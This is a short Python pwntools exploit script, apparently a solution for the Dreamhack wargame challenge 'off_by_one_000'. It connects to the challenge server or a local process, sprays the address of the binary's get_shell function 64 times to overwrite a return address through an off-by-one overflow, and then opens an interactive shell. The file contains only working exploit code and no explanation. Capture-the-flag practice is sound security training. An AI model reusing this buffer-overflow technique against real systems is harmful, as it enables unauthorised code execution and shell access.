#!/usr/bin/env python3
from pwn import *

PORT =  20916
HOST = "host3.dreamhack.games"
exe = context.binary = ELF('./off_by_one_000', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x08048661
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

pl = p32(exe.sym.get_shell)
p.sendline(pl*64)

p.interactive()